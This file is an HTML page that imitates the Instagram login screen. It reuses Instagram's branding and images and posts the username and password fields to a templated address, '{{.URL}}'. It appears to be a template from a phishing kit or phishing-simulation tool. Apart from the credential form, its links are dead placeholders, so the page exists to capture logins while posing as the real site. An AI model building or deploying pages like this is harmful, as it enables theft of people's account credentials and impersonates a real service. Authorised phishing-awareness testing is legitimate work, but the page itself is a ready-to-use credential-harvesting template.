<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 350px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 20px 40px;
      text-align: center;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      width: 175px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }

    .login-btn {
      width: 100%;
      background-color: #3897f0;
      border: none;
      color: white;
      padding: 10px;
      margin-top: 10px;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }

    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .divider:not(:empty)::before {
      margin-right: .25em;
    }

    .divider:not(:empty)::after {
      margin-left: .25em;
    }

    .facebook-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot {
      display: block;
      margin-top: 15px;
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }

    .signup-box {
      margin-top: 20px;
      padding: 20px;
      border: 1px solid #dbdbdb;
      background: #fff;
      font-size: 14px;
    }

    .signup-box a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }

  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
    </div>

    <form method="POST" action="{{.URL}}">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button class="login-btn" type="submit">Log In</button>
    </form>

    <div class="divider">OR</div>

    <a href="#" class="facebook-login">Log in with Facebook</a>
    <a href="#" class="forgot">Forgot password?</a>

    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="footer">
      &copy; 2025 Instagram from Meta
    </div>
  </div>

</body>
</html>
